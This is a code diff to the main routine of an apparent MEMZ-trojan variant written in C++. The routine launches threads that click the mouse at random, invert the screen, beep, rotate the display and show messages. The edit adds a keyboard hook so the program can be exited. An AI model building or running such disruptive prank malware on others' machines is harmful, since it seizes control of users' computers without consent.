@@ -1,5 +1,5 @@
 #include "thread" // I Don't Know Why It Cannot Build In MEMZ.h
-#include "MEMZ.h" // Process Main 
+#include "MEMZ.h" // Process Main
 
 using namespace std;
 
@@ -8,7 +8,8 @@ int main()
 	disable_redraw(); // Disable Redraw
 	StartWarning(); // Warning
 	CreateNote(); // Create Note
-	Sleep(5000); // Wait 5 Secounds...
+	// Make Window On Top
+	Sleep(800); // Wait 0.8 Secounds(Anti Crash)...
 	// Main Process Zone //
 	thread a(infclick); // Random Click
 	thread b(infInvColor); // Invert Screen Color
@@ -31,6 +32,13 @@ int main()
 	thread s(rand_beep); // Random Beep
 	thread t(sayNyan); // Your computer was not trashed by the MEMZ Trojan. Now you can't enjoy the Nyan Cat~
 	thread u(OrientationsScreen); // Random Orientations Screens
+	thread v(InstallKeyboardHook); // Exit Program When Enter/Exit Pressed
+	/*
+	thread w(); // Waiting For Use
+	thread x(); // Waiting For Use
+	thread y(); // Waiting For Use
+	thread z(); // Waiting For Use
+	*/
 	getchar(); // Pause Program
 	return 0; // Normal Exit
 }
